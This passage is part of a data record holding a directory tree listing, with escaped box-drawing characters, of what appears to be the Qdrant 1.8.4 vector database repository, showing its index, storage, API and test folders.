\u251c\u2500\u2500 fixtures\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 id_tracker\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 field_index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 full_text_index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 geo_index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 map_index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 numeric_index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 hnsw_index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 query_optimization\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 sparse_index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 json_path\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 payload_storage\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 segment_constructor\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 spaces\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 utils\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 vector_storage\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 quantized\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 query\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 query_scorer\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 integration\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0         \u251c\u2500\u2500 fixtures\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0         \u2514\u2500\u2500 utils\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 sparse\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 common\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 index\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0         \u2514\u2500\u2500 inverted_index\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 storage\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 src\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 content_manager\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0     \u251c\u2500\u2500 consensus\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0     \u251c\u2500\u2500 snapshots\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0     \u2514\u2500\u2500 toc\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0         \u2514\u2500\u2500 integration\n\u251c\u2500\u2500 openapi\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 schemas\n\u251c\u2500\u2500 pkg\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 appimage\n\u251c\u2500\u2500 src\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 actix\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 api\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 common\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 telemetry_ops\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 migrations\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 tonic\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 api\n\u251c\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 api_key\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 consensus_tests\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 low-ram\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 openapi\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 openapi_integration\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 helpers\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 snapshots\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 storage-compat\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 populate_db\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 tls\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 cert\n\u2514\u2500\u2500 tools\n    \u2514\u2500\u2500 schema2openapi\n\n163 directories\n",
    "repo_path": "qdrant-1.8.4/"
}